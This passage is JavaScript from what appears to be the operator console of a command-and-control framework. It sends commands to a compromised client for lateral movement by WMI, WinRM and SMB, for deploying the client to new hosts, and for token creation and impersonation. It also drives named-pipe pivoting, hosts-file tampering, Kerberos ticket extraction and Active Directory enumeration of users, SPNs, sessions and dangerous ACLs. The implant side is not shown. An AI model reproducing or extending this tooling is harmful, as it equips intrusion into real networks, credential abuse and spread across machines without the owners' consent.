          const user = remoteUserInput?.value?.trim();
          const pass = remotePassInput?.value;
          const domain = remoteDomainInput?.value?.trim() || null;

          if (!user || !pass) {
            remotePipeStatus.textContent = 'Please enter username and password';
            remotePipeStatus.style.color = '#ef4444';
            return;
          }

          target.username = user;
          target.password = pass;
          target.domain = domain;
        }

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: {
              type: 'ProxyConnectTarget',
              params: {
                conn_id: Math.floor(Math.random() * 0xFFFFFFFF),
                target: target
              }
            }
          });
          remotePipeStatus.textContent = 'Connection request sent. Check logs for status.';
          remotePipeStatus.style.color = '#22c55e';
        } catch (e) {
          console.error('Failed to connect to remote pipe:', e);
          remotePipeStatus.textContent = 'Failed: ' + e;
          remotePipeStatus.style.color = '#ef4444';
        }
      });

      // Check status on open
      checkProxyStatus();
      break;

    case 'dns-management':
      const dnsList = document.getElementById('dns-list');
      const dnsAddForm = document.getElementById('dns-add-form');
      const dnsHostnameInput = document.getElementById('dns-hostname');
      const dnsIpInput = document.getElementById('dns-ip');
      const dnsStatus = document.getElementById('dns-status');
      const dnsRefreshBtn = document.getElementById('dns-refresh');
      const dnsAddBtn = document.getElementById('dns-add');
      const dnsSaveBtn = document.getElementById('dns-save');
      const dnsCancelBtn = document.getElementById('dns-cancel');

      let dnsEntries = [];
      let dnsUnlisten = null;

      const renderDnsList = () => {
        if (dnsEntries.length === 0) {
          dnsList.innerHTML = '<div style="padding:12px;color:#888;text-align:center;">No entries found</div>';
          return;
        }
        dnsList.innerHTML = dnsEntries.map((entry, idx) => `
          <div class="dns-entry" style="display:flex;justify-content:space-between;align-items:center;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05);">
            <div>
              <span style="color:#64b4ff;">${entry.hostname}</span>
              <span style="color:#888;margin-left:8px;">→</span>
              <span style="color:#aaa;margin-left:8px;">${entry.ip}</span>
              ${entry.comment ? `<span style="color:#666;margin-left:8px;font-size:11px;"># ${entry.comment}</span>` : ''}
            </div>
            <span class="dns-remove" data-hostname="${entry.hostname}" style="color:#888;cursor:pointer;font-size:14px;" title="Remove">×</span>
          </div>
        `).join('');

        // Bind remove handlers
        dnsList.querySelectorAll('.dns-remove').forEach(btn => {
          btn.addEventListener('click', async (e) => {
            const hostname = e.target.dataset.hostname;
            dnsStatus.textContent = 'Removing...';
            dnsStatus.style.color = '#888';
            try {
              await invoke('send_command', {
                uid: client.uid,
                command: { type: 'RemoveHostsEntry', params: { hostname } }
              });
            } catch (err) {
              dnsStatus.textContent = 'Error: ' + err;
              dnsStatus.style.color = '#ef4444';
            }
          });
        });
      };

      const fetchDnsEntries = async () => {
        dnsList.innerHTML = '<div style="padding:12px;color:#888;text-align:center;">Loading...</div>';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'GetHostsEntries' }
          });
        } catch (err) {
          dnsList.innerHTML = `<div style="padding:12px;color:#ef4444;text-align:center;">Error: ${err}</div>`;
        }
      };

      // Setup listener for DNS responses
      (async () => {
        const { listen } = window.__TAURI__.event;
        dnsUnlisten = await listen('shell-response', (event) => {
          if (event.payload.uid !== client.uid) return;
          const response = event.payload.response;

          if (response?.data?.type === 'HostsEntries') {
            dnsEntries = response.data.result?.entries || [];
            renderDnsList();
            dnsStatus.textContent = `${dnsEntries.length} entries`;
            dnsStatus.style.color = '#666';
          } else if (response?.data?.type === 'HostsResult') {
            const result = response.data.result;
            if (result?.success) {
              dnsStatus.textContent = result.message || 'Success';
              dnsStatus.style.color = '#22c55e';
              fetchDnsEntries(); // Refresh list
            } else {
              dnsStatus.textContent = result?.message || 'Operation failed';
              dnsStatus.style.color = '#ef4444';
            }
          }
        });
        // Now fetch after listener is ready
        fetchDnsEntries();
      })();

      dnsRefreshBtn?.addEventListener('click', fetchDnsEntries);

      dnsAddBtn?.addEventListener('click', () => {
        dnsAddForm.style.display = 'block';
        dnsHostnameInput.focus();
      });

      dnsCancelBtn?.addEventListener('click', () => {
        dnsAddForm.style.display = 'none';
        dnsHostnameInput.value = '';
        dnsIpInput.value = '';
      });

      dnsSaveBtn?.addEventListener('click', async () => {
        const hostname = dnsHostnameInput.value.trim();
        const ip = dnsIpInput.value.trim();

        if (!hostname || !ip) {
          dnsStatus.textContent = 'Please enter both hostname and IP';
          dnsStatus.style.color = '#ef4444';
          return;
        }

        dnsStatus.textContent = 'Adding...';
        dnsStatus.style.color = '#888';
        dnsAddForm.style.display = 'none';
        dnsHostnameInput.value = '';
        dnsIpInput.value = '';

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'AddHostsEntry', params: { hostname, ip } }
          });
        } catch (err) {
          dnsStatus.textContent = 'Error: ' + err;
          dnsStatus.style.color = '#ef4444';
        }
      });

      // Cleanup on popup close
      popupCleanupCallback = () => {
        if (dnsUnlisten) {
          dnsUnlisten();
        }
      };
      break;

    case 'lateral-movement':
      let lateralUnlisten = null;

      // Tab switching
      document.querySelectorAll('.lateral-tabs .cb-tab').forEach(tab => {
        tab.addEventListener('click', () => {
          document.querySelectorAll('.lateral-tabs .cb-tab').forEach(t => t.classList.remove('active'));
          tab.classList.add('active');
          document.querySelectorAll('.lateral-panel').forEach(p => p.style.display = 'none');
          document.getElementById(`lateral-${tab.dataset.tab}`).style.display = 'block';
        });
      });

      // Setup listener for lateral movement responses
      const setupLateralListener = async () => {
        const { listen } = window.__TAURI__.event;
        return listen('shell-response', (event) => {
          if (event.payload.uid !== client.uid) return;
          const response = event.payload.response;

          // Credential test result
          if (response?.data?.type === 'LateralCredentialResult') {
            const result = response.data.result;
            const status = document.getElementById('lateral-exec-status');
            if (result?.success) {
              status.textContent = 'Credentials valid!';
              status.style.color = '#22c55e';
            } else {
              status.textContent = result?.message || 'Authentication failed';
              status.style.color = '#ef4444';
            }
            document.getElementById('lateral-test-creds').disabled = false;
          }
          // Execution result
          else if (response?.data?.type === 'LateralExecResult') {
            const result = response.data.result;
            const status = document.getElementById('lateral-exec-status');
            const output = document.getElementById('lateral-exec-output');
            if (result?.success) {
              status.textContent = 'Command executed successfully';
              status.style.color = '#22c55e';
              if (result.output) {
                output.style.display = 'block';
                output.textContent = result.output;
              }
            } else {
              status.textContent = result?.message || 'Execution failed';
              status.style.color = '#ef4444';
            }
            document.getElementById('lateral-exec-btn').disabled = false;
          }
          // Deploy result
          else if (response?.data?.type === 'LateralDeployResult') {
            const result = response.data.result;
            const status = document.getElementById('lateral-deploy-status');
            if (result?.success) {
              status.textContent = 'Client deployed successfully!';
              status.style.color = '#22c55e';
            } else {
              status.textContent = result?.message || 'Deployment failed';
              status.style.color = '#ef4444';
            }
            document.getElementById('lateral-deploy-btn').disabled = false;
          }
          // Token Created
          else if (response?.data?.type === 'TokenCreated') {
            const result = response.data.result;
            document.getElementById('token-status').textContent = `Token created: ${result.domain}\\${result.username} (ID: ${result.token_id})`;
            document.getElementById('token-status').style.color = '#22c55e';
            // Clear inputs
            document.getElementById('token-domain').value = '';
            document.getElementById('token-username').value = '';
            document.getElementById('token-password').value = '';
            // Refresh token list
            invoke('send_command', { uid: client.uid, command: { type: 'TokenList' } });
          }
          // Token List
          else if (response?.data?.type === 'TokenListResult') {
            const tokens = response.data.result?.tokens || [];
            renderTokenList(tokens);
          }
          // Token Impersonate
          else if (response?.data?.type === 'TokenImpersonateResult') {
            const result = response.data.result;
            const status = document.getElementById('token-status');
            if (result?.success) {
              status.textContent = result.message;
              status.style.color = '#22c55e';
              // Refresh token list to show active state
              invoke('send_command', { uid: client.uid, command: { type: 'TokenList' } });
            } else {
              status.textContent = result?.message || 'Impersonation failed';
              status.style.color = '#ef4444';
            }
          }
          // Token Revert
          else if (response?.data?.type === 'TokenRevertResult') {
            const result = response.data.result;
            const status = document.getElementById('token-status');
            if (result?.success) {
              status.textContent = 'Reverted to original token';
              status.style.color = '#22c55e';
              // Refresh token list to clear active state
              invoke('send_command', { uid: client.uid, command: { type: 'TokenList' } });
            } else {
              status.textContent = result?.message || 'Revert failed';
              status.style.color = '#ef4444';
            }
          }
          // Token Delete
          else if (response?.data?.type === 'TokenDeleteResult') {
            const result = response.data.result;
            if (result?.success) {
              // Refresh token list
              invoke('send_command', { uid: client.uid, command: { type: 'TokenList' } });
            } else {
              document.getElementById('token-status').textContent = result?.message || 'Delete failed';
              document.getElementById('token-status').style.color = '#ef4444';
            }
          }
          // Jump Result
          else if (response?.data?.type === 'JumpResult') {
            const result = response.data.result;
            const status = document.getElementById('jump-status');
            const output = document.getElementById('jump-output');

            if (result?.success) {
              status.textContent = result.message;
              status.style.color = '#22c55e';
            } else {
              status.textContent = result?.message || 'Jump failed';
              status.style.color = '#ef4444';
            }

            // Show step-by-step output
            if (result?.steps && result.steps.length > 0) {
              output.style.display = 'block';
              output.innerHTML = result.steps.map(step => {
                const color = step.includes('Error') || step.includes('Failed') ? '#ef4444' :
                              step.includes('success') || step.includes('started') ? '#22c55e' : '#aaa';
                return `<div style="color:${color};margin-bottom:4px;">${step}</div>`;
              }).join('');
            }
            document.getElementById('jump-exec-btn').disabled = false;
          }
          // Pivot Connected
          else if (response?.data?.type === 'PivotConnected') {
            const result = response.data.result;
            document.getElementById('pivot-status').textContent = `Connected to \\\\${result.host}\\pipe\\${result.pipe_name} (ID: ${result.pivot_id})`;
            document.getElementById('pivot-status').style.color = '#22c55e';
            // Clear inputs
            document.getElementById('pivot-host').value = '';
            document.getElementById('pivot-pipe').value = '';
            // Refresh pivot list
            invoke('send_command', { uid: client.uid, command: { type: 'PivotList' } });
          }
          // Pivot Disconnected
          else if (response?.data?.type === 'PivotDisconnected') {
            document.getElementById('pivot-status').textContent = 'Pivot disconnected';
            document.getElementById('pivot-status').style.color = '#888';
            // Refresh pivot list
            invoke('send_command', { uid: client.uid, command: { type: 'PivotList' } });
          }
          // Pivot List
          else if (response?.data?.type === 'PivotListResult') {
            const pivots = response.data.result?.pivots || [];
            renderPivotList(pivots);
          }
          // =========================================================================
          // Active Directory Responses
          // =========================================================================
          // AD Domain Info
          else if (response?.data?.type === 'AdDomainInfo') {
            const info = response.data.result;
            const domainEl = document.getElementById('ad-domain-info');
            domainEl.innerHTML = `
              <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:4px;">
                <div><span style="color:#666;">Domain:</span> <span style="color:#64b4ff;">${info.domain_name || 'N/A'}</span></div>
                <div><span style="color:#666;">Forest:</span> <span style="color:#aaa;">${info.forest_name || 'N/A'}</span></div>
                <div><span style="color:#666;">DC:</span> <span style="color:#aaa;">${info.domain_controller || 'N/A'}</span></div>
                <div><span style="color:#666;">DC IP:</span> <span style="color:#aaa;">${info.domain_controller_ip || 'N/A'}</span></div>
                <div><span style="color:#666;">Level:</span> <span style="color:#aaa;">${info.functional_level || 'N/A'}</span></div>
                <div><span style="color:#666;">Joined:</span> <span style="color:${info.is_domain_joined ? '#22c55e' : '#ef4444'};">${info.is_domain_joined ? 'Yes' : 'No'}</span></div>
              </div>
            `;
            document.getElementById('ad-status').textContent = 'Domain info retrieved';
            document.getElementById('ad-status').style.color = '#22c55e';
          }
          // AD User List
          else if (response?.data?.type === 'AdUserList') {
            const users = response.data.result?.users || [];
            renderAdResults('users', users);
          }
          // AD Group List
          else if (response?.data?.type === 'AdGroupList') {
            const groups = response.data.result?.groups || [];
            renderAdResults('groups', groups);
          }
          // AD Group Members
          else if (response?.data?.type === 'AdGroupMembers') {
            const members = response.data.result?.members || [];
            renderAdResults('members', members);
          }
          // AD Computer List
          else if (response?.data?.type === 'AdComputerList') {
            const computers = response.data.result?.computers || [];
            renderAdResults('computers', computers);
          }
          // AD SPN List
          else if (response?.data?.type === 'AdSpnList') {
            const spns = response.data.result?.spns || [];
            renderAdResults('spns', spns);
          }
          // AD Session List
          else if (response?.data?.type === 'AdSessionList') {
            const sessions = response.data.result?.sessions || [];
            renderAdResults('sessions', sessions);
          }
          // AD Trust List
          else if (response?.data?.type === 'AdTrustList') {
            const trusts = response.data.result?.trusts || [];
            renderAdResults('trusts', trusts);
          }
          // =========================================================================
          // Kerberos Responses
          // =========================================================================
          // Kerberos Ticket List
          else if (response?.data?.type === 'KerberosTicketList') {
            const tickets = response.data.result?.tickets || [];
            renderKerberosTickets(tickets);
          }
          // Kerberos Operation Result (purge)
          else if (response?.data?.type === 'KerberosResult') {
            const result = response.data.result;
            const status = document.getElementById('kerb-status');
            status.textContent = result?.message || (result?.success ? 'Operation completed' : 'Operation failed');
            status.style.color = result?.success ? '#22c55e' : '#ef4444';
            // If purge succeeded, refresh ticket list
            if (result?.success && result?.message?.includes('purge')) {
              invoke('send_command', { uid: client.uid, command: { type: 'KerberosExtractTickets' } });
            }
          }
          // =========================================================================
          // Security Responses
          // =========================================================================
          // Local Groups List
          else if (response?.data?.type === 'LocalGroupList') {
            const groups = response.data.result?.groups || [];
            renderLocalGroups(groups);
          }
          // Remote Access Rights
          else if (response?.data?.type === 'RemoteAccessRights') {
            const rights = response.data.result?.rights || {};
            renderRemoteAccessRights(rights);
          }
          // AD ACL List
          else if (response?.data?.type === 'AdAclList') {
            const acls = response.data.result?.acls || [];
            renderAdAcls(acls);
          }
          // Error
          else if (response?.data?.type === 'Error') {
            const msg = response.data.result?.message || 'Unknown error';
            // Update whichever status is relevant
            ['lateral-exec-status', 'lateral-deploy-status', 'token-status', 'jump-status', 'pivot-status', 'ad-status', 'kerb-status', 'sec-status'].forEach(id => {
              const el = document.getElementById(id);
              if (el) {
                el.textContent = 'Error: ' + msg;
                el.style.color = '#ef4444';
              }
            });
          }
        });
      };

      lateralUnlisten = setupLateralListener();

      // =========================================================================
      // AD ENUMERATION RENDER FUNCTIONS
      // =========================================================================

      const renderAdResults = (type, data) => {
        const results = document.getElementById('ad-results');
        const status = document.getElementById('ad-status');

        if (!data || data.length === 0) {
          results.innerHTML = '<div style="color:#666;font-size:11px;text-align:center;padding:40px;">No results found</div>';
          status.textContent = 'No results';
          status.style.color = '#888';
          return;
        }

        status.textContent = `Found ${data.length} ${type}`;
        status.style.color = '#22c55e';

        switch(type) {
          case 'users':
            results.innerHTML = data.map(u => `
              <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                  <span style="color:${u.is_admin ? '#f59e0b' : '#64b4ff'};font-weight:500;">${u.sam_account_name}</span>
                  <div style="display:flex;gap:4px;">
                    ${u.is_admin ? '<span style="background:rgba(245,158,11,.2);color:#f59e0b;padding:1px 4px;border-radius:2px;font-size:9px;">ADMIN</span>' : ''}
                    ${u.enabled ? '<span style="color:#22c55e;font-size:9px;">enabled</span>' : '<span style="color:#ef4444;font-size:9px;">disabled</span>'}
                  </div>
                </div>
                ${u.display_name ? `<div style="color:#888;font-size:10px;">${u.display_name}</div>` : ''}
                ${u.description ? `<div style="color:#666;font-size:9px;margin-top:2px;">${u.description}</div>` : ''}
              </div>
            `).join('');
            break;
          case 'groups':
            results.innerHTML = data.map(g => `
              <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                  <span style="color:#64b4ff;font-weight:500;">${g.sam_account_name}</span>
                  <span style="color:#666;font-size:10px;">${g.member_count} members</span>
                </div>
                <div style="color:#888;font-size:10px;">${g.scope} | ${g.group_type}</div>
                ${g.description ? `<div style="color:#666;font-size:9px;margin-top:2px;">${g.description}</div>` : ''}
              </div>
            `).join('');
            break;
          case 'computers':
            results.innerHTML = data.map(c => `
              <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                  <span style="color:${c.is_dc ? '#f59e0b' : '#64b4ff'};font-weight:500;">${c.name}</span>
                  <div style="display:flex;gap:4px;">
                    ${c.is_dc ? '<span style="background:rgba(245,158,11,.2);color:#f59e0b;padding:1px 4px;border-radius:2px;font-size:9px;">DC</span>' : ''}
                    ${c.is_server ? '<span style="color:#888;font-size:9px;">Server</span>' : '<span style="color:#666;font-size:9px;">Workstation</span>'}
                  </div>
                </div>
                ${c.dns_hostname ? `<div style="color:#888;font-size:10px;">${c.dns_hostname}</div>` : ''}
                ${c.os ? `<div style="color:#666;font-size:9px;">${c.os} ${c.os_version || ''}</div>` : ''}
              </div>
            `).join('');
            break;
          case 'spns':
            results.innerHTML = data.map(s => `
              <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
                <div style="color:#64b4ff;font-family:monospace;font-size:10px;word-break:break-all;">${s.spn}</div>
                <div style="display:flex;justify-content:space-between;margin-top:2px;">
                  <span style="color:#888;font-size:10px;">${s.account_name}</span>
                  <span style="color:#666;font-size:9px;">${s.service_type}</span>
                </div>
              </div>
            `).join('');
            break;
          case 'sessions':
            results.innerHTML = data.map(s => `
              <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                  <span style="color:#64b4ff;font-weight:500;">${s.username}</span>
                  <span style="color:#888;font-size:10px;">@ ${s.computer}</span>
                </div>
                <div style="color:#666;font-size:10px;">Session ${s.session_id} | ${s.session_type}</div>
              </div>
            `).join('');
            break;
          case 'trusts':
            results.innerHTML = data.map(t => `
              <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                  <span style="color:#64b4ff;font-weight:500;">${t.target_domain}</span>
                  <span style="color:#888;font-size:10px;">${t.direction}</span>
                </div>
                <div style="color:#666;font-size:10px;">${t.trust_type} | ${t.is_transitive ? 'Transitive' : 'Non-transitive'}</div>
              </div>
            `).join('');
            break;
          default:
            results.innerHTML = `<pre style="font-size:10px;color:#aaa;margin:0;">${JSON.stringify(data, null, 2)}</pre>`;
        }
      };

      // =========================================================================
      // KERBEROS RENDER FUNCTIONS
      // =========================================================================

      const renderKerberosTickets = (tickets) => {
        const list = document.getElementById('kerb-ticket-list');
        const status = document.getElementById('kerb-status');

        if (!tickets || tickets.length === 0) {
          list.innerHTML = '<div style="color:#666;font-size:11px;text-align:center;padding:30px;">No tickets in current session</div>';
          status.textContent = 'No tickets found';
          status.style.color = '#888';
          return;
        }

        status.textContent = `Found ${tickets.length} ticket(s)`;
        status.style.color = '#22c55e';

        list.innerHTML = tickets.map(t => `
          <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);font-size:10px;">
            <div style="display:flex;justify-content:space-between;align-items:center;">
              <span style="color:#64b4ff;font-weight:500;">${t.server_name}</span>
              <span style="color:#888;">${t.etype}</span>
            </div>
            <div style="color:#aaa;margin-top:2px;">Client: ${t.client_name}@${t.client_realm}</div>
            <div style="color:#666;margin-top:2px;">
              Valid: ${t.start_time} - ${t.end_time}
            </div>
            ${t.flags && t.flags.length > 0 ? `
              <div style="margin-top:4px;display:flex;flex-wrap:wrap;gap:2px;">
                ${t.flags.map(f => `<span style="background:rgba(100,180,255,.1);color:#64b4ff;padding:1px 4px;border-radius:2px;font-size:8px;">${f}</span>`).join('')}
              </div>
            ` : ''}
          </div>
        `).join('');
      };

      // =========================================================================
      // SECURITY RENDER FUNCTIONS
      // =========================================================================

      const renderLocalGroups = (groups) => {
        const results = document.getElementById('sec-results');
        const status = document.getElementById('sec-status');

        if (!groups || groups.length === 0) {
          results.innerHTML = '<div style="color:#666;font-size:11px;text-align:center;padding:40px;">No local groups found</div>';
          status.textContent = 'No groups found';
          status.style.color = '#888';
          return;
        }

        status.textContent = `Found ${groups.length} group(s)`;
        status.style.color = '#22c55e';

        results.innerHTML = groups.map(g => `
          <div style="margin-bottom:10px;padding:8px;background:rgba(0,0,0,.2);border-radius:4px;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
              <span style="color:#64b4ff;font-weight:500;font-size:11px;">${g.name}</span>
              <span style="color:#888;font-size:10px;">${g.members?.length || 0} member(s)</span>
            </div>
            ${g.comment ? `<div style="color:#666;font-size:10px;margin-bottom:6px;">${g.comment}</div>` : ''}
            ${g.members && g.members.length > 0 ? `
              <div style="background:rgba(0,0,0,.2);padding:6px;border-radius:4px;">
                ${g.members.map(m => `
                  <div style="display:flex;justify-content:space-between;padding:2px 0;font-size:10px;">
                    <span style="color:#aaa;">${m.name}</span>
                    <span style="color:#666;">${m.account_type}</span>
                  </div>
                `).join('')}
              </div>
            ` : '<div style="color:#666;font-size:10px;">No members</div>'}
          </div>
        `).join('');
      };

      const renderRemoteAccessRights = (rights) => {
        const results = document.getElementById('sec-results');
        const status = document.getElementById('sec-status');

        status.textContent = 'Remote access analysis complete';
        status.style.color = '#22c55e';

        const renderAccess = (access) => {
          if (!access) return '<div style="color:#666;font-size:10px;">Not available</div>';
          const enabled = access.enabled ?
            '<span style="color:#22c55e;">Enabled</span>' :
            '<span style="color:#888;">Disabled</span>';
          return `
            <div style="margin-bottom:4px;">
              <span style="font-size:10px;">Status: ${enabled}</span>
              ${access.service_running !== undefined ? `
                <span style="margin-left:8px;font-size:10px;">Service: ${access.service_running ?
                  '<span style="color:#22c55e;">Running</span>' :
                  '<span style="color:#888;">Stopped</span>'}</span>
              ` : ''}
            </div>
            ${access.authorized_users && access.authorized_users.length > 0 ? `
              <div style="background:rgba(0,0,0,.2);padding:6px;border-radius:4px;margin-top:4px;">
                <div style="color:#888;font-size:9px;margin-bottom:4px;">Authorized Users/Groups:</div>
                ${access.authorized_users.map(u => `
                  <div style="color:#aaa;font-size:10px;padding:1px 0;">${u}</div>
                `).join('')}
              </div>
            ` : ''}
          `;
        };

        results.innerHTML = `
          <div style="padding:8px;background:rgba(0,0,0,.2);border-radius:4px;margin-bottom:8px;">
            <div style="color:#64b4ff;font-weight:500;font-size:11px;margin-bottom:6px;">RDP (Remote Desktop)</div>
            ${renderAccess(rights.rdp)}
          </div>
          <div style="padding:8px;background:rgba(0,0,0,.2);border-radius:4px;margin-bottom:8px;">
            <div style="color:#64b4ff;font-weight:500;font-size:11px;margin-bottom:6px;">WinRM (PowerShell Remoting)</div>
            ${renderAccess(rights.winrm)}
          </div>
          <div style="padding:8px;background:rgba(0,0,0,.2);border-radius:4px;">
            <div style="color:#64b4ff;font-weight:500;font-size:11px;margin-bottom:6px;">DCOM</div>
            ${renderAccess(rights.dcom)}
          </div>
        `;
      };

      const renderAdAcls = (acls) => {
        const results = document.getElementById('sec-results');
        const status = document.getElementById('sec-status');

        if (!acls || acls.length === 0) {
          results.innerHTML = '<div style="color:#666;font-size:11px;text-align:center;padding:40px;">No interesting ACLs found</div>';
          status.textContent = 'No ACLs found (or all are expected defaults)';
          status.style.color = '#888';
          return;
        }

        status.textContent = `Found ${acls.length} object(s) with interesting permissions`;
        status.style.color = '#22c55e';

        // Color code dangerous rights
        const getRightColor = (right) => {
          if (right.includes('GenericAll') || right.includes('WriteDACL') || right.includes('WriteOwner')) {
            return '#ef4444'; // Red - most dangerous
          } else if (right.includes('ForceChangePassword') || right.includes('DCSync')) {
            return '#f97316'; // Orange - dangerous
          } else if (right.includes('GenericWrite') || right.includes('AllExtendedRights')) {
            return '#eab308'; // Yellow - concerning
          }
          return '#64b4ff'; // Blue - informational
        };

        results.innerHTML = acls.map(obj => `
          <div style="margin-bottom:10px;padding:8px;background:rgba(0,0,0,.2);border-radius:4px;">
            <div style="color:#64b4ff;font-weight:500;font-size:10px;margin-bottom:4px;word-break:break-all;">${obj.object_dn}</div>
            <div style="color:#666;font-size:9px;margin-bottom:6px;">Type: ${obj.object_type || 'Unknown'}</div>
            ${obj.aces && obj.aces.length > 0 ? `
              <div style="background:rgba(0,0,0,.2);padding:6px;border-radius:4px;">
                ${obj.aces.map(ace => `
                  <div style="padding:4px 0;border-bottom:1px solid rgba(255,255,255,.05);">
                    <div style="display:flex;justify-content:space-between;align-items:center;">
                      <span style="color:#aaa;font-size:10px;font-weight:500;">${ace.principal}</span>
                    </div>
                    <div style="margin-top:2px;display:flex;flex-wrap:wrap;gap:3px;">
                      ${ace.rights ? ace.rights.split(', ').map(r => `
                        <span style="background:rgba(0,0,0,.3);color:${getRightColor(r)};padding:1px 4px;border-radius:2px;font-size:9px;">${r}</span>
                      `).join('') : ''}
                    </div>
                  </div>
                `).join('')}
              </div>
            ` : '<div style="color:#666;font-size:10px;">No non-default ACEs</div>'}
          </div>
        `).join('');
      };

      // Test credentials button (uses same fields as Execute)
      document.getElementById('lateral-test-creds')?.addEventListener('click', async () => {
        const host = document.getElementById('lateral-exec-host').value.trim();
        const username = document.getElementById('lateral-exec-user').value.trim();
        const password = document.getElementById('lateral-exec-pass').value;
        const protocol = document.querySelector('input[name="lateral-exec-method"]:checked')?.value || 'wmi';

        if (!host || !username) {
          document.getElementById('lateral-exec-status').textContent = 'Please enter host and username';
          document.getElementById('lateral-exec-status').style.color = '#ef4444';
          return;
        }

        document.getElementById('lateral-test-creds').disabled = true;
        document.getElementById('lateral-exec-status').textContent = 'Testing credentials...';
        document.getElementById('lateral-exec-status').style.color = '#888';

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'LateralTestCredentials', params: { host, username, password, protocol } }
          });
        } catch (err) {
          document.getElementById('lateral-exec-status').textContent = 'Error: ' + err;
          document.getElementById('lateral-exec-status').style.color = '#ef4444';
          document.getElementById('lateral-test-creds').disabled = false;
        }
      });

      // Execute command button
      document.getElementById('lateral-exec-btn')?.addEventListener('click', async () => {
        const host = document.getElementById('lateral-exec-host').value.trim();
        const username = document.getElementById('lateral-exec-user').value.trim();
        const password = document.getElementById('lateral-exec-pass').value;
        const method = document.querySelector('input[name="lateral-exec-method"]:checked')?.value || 'wmi';
        const command = document.getElementById('lateral-exec-cmd').value.trim();

        if (!host || !username || !command) {
          document.getElementById('lateral-exec-status').textContent = 'Please fill in all fields';
          document.getElementById('lateral-exec-status').style.color = '#ef4444';
          return;
        }

        document.getElementById('lateral-exec-btn').disabled = true;
        document.getElementById('lateral-exec-status').textContent = 'Executing command...';
        document.getElementById('lateral-exec-status').style.color = '#888';
        document.getElementById('lateral-exec-output').style.display = 'none';

        // Map method to command type
        const commandTypes = {
          'wmi': 'LateralExecWmi',
          'winrm': 'LateralExecWinRm',
          'smb': 'LateralExecSmb'
        };

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: commandTypes[method], params: { host, username, password, command } }
          });
        } catch (err) {
          document.getElementById('lateral-exec-status').textContent = 'Error: ' + err;
          document.getElementById('lateral-exec-status').style.color = '#ef4444';
          document.getElementById('lateral-exec-btn').disabled = false;
        }
      });

      // =========================================================================
      // TOKEN MANAGEMENT
      // =========================================================================

      const renderTokenList = (tokens) => {
        const list = document.getElementById('token-list');
        if (!tokens || tokens.length === 0) {
          list.innerHTML = '<div style="color:#666;font-size:11px;padding:20px;text-align:center;">No tokens created</div>';
          return;
        }
        list.innerHTML = tokens.map(t => `
          <div class="token-item" data-id="${t.id}" style="padding:8px;margin:4px 0;background:${t.active ? 'rgba(34,197,94,.1)' : 'rgba(255,255,255,.03)'};border-radius:4px;border:1px solid ${t.active ? 'rgba(34,197,94,.3)' : 'rgba(255,255,255,.05)'};">
            <div style="display:flex;justify-content:space-between;align-items:center;">
              <div>
                <span style="color:${t.active ? '#22c55e' : '#64b4ff'};font-weight:500;">${t.domain}\\${t.username}</span>
                ${t.active ? '<span style="color:#22c55e;font-size:10px;margin-left:8px;">(ACTIVE)</span>' : ''}
              </div>
              <div style="display:flex;gap:4px;">
                ${!t.active ? `<button class="fm-btn token-impersonate" data-id="${t.id}" style="padding:2px 8px;font-size:10px;">Impersonate</button>` : ''}
                <button class="fm-btn token-delete" data-id="${t.id}" style="padding:2px 8px;font-size:10px;background:rgba(239,68,68,.2);">Delete</button>
              </div>
            </div>
            <div style="font-size:10px;color:#666;margin-top:4px;">ID: ${t.id} | Type: ${t.token_type}</div>
          </div>
        `).join('');

        // Bind impersonate buttons
        list.querySelectorAll('.token-impersonate').forEach(btn => {
          btn.addEventListener('click', async (e) => {
            e.stopPropagation();
            const tokenId = parseInt(btn.dataset.id);
            document.getElementById('token-status').textContent = 'Impersonating...';
            document.getElementById('token-status').style.color = '#888';
            try {
              await invoke('send_command', {
                uid: client.uid,
                command: { type: 'TokenImpersonate', params: { token_id: tokenId } }
              });
            } catch (err) {
              document.getElementById('token-status').textContent = 'Error: ' + err;
              document.getElementById('token-status').style.color = '#ef4444';
            }
          });
        });

        // Bind delete buttons
        list.querySelectorAll('.token-delete').forEach(btn => {
          btn.addEventListener('click', async (e) => {
            e.stopPropagation();
            const tokenId = parseInt(btn.dataset.id);
            try {
              await invoke('send_command', {
                uid: client.uid,
                command: { type: 'TokenDelete', params: { token_id: tokenId } }
              });
            } catch (err) {
              document.getElementById('token-status').textContent = 'Error: ' + err;
              document.getElementById('token-status').style.color = '#ef4444';
            }
          });
        });
      };

      // Token make button
      document.getElementById('token-make-btn')?.addEventListener('click', async () => {
        const domain = document.getElementById('token-domain').value.trim() || '.';
        const username = document.getElementById('token-username').value.trim();
        const password = document.getElementById('token-password').value;

        if (!username || !password) {
          document.getElementById('token-status').textContent = 'Please enter username and password';
          document.getElementById('token-status').style.color = '#ef4444';
          return;
        }

        document.getElementById('token-status').textContent = 'Creating token...';
        document.getElementById('token-status').style.color = '#888';

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'TokenMake', params: { domain, username, password } }
          });
        } catch (err) {
          document.getElementById('token-status').textContent = 'Error: ' + err;
          document.getElementById('token-status').style.color = '#ef4444';
        }
      });

      // Token refresh button
      document.getElementById('token-refresh-btn')?.addEventListener('click', async () => {
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'TokenList' }
          });
        } catch (err) {
          document.getElementById('token-status').textContent = 'Error: ' + err;
          document.getElementById('token-status').style.color = '#ef4444';
        }
      });

      // Token revert button
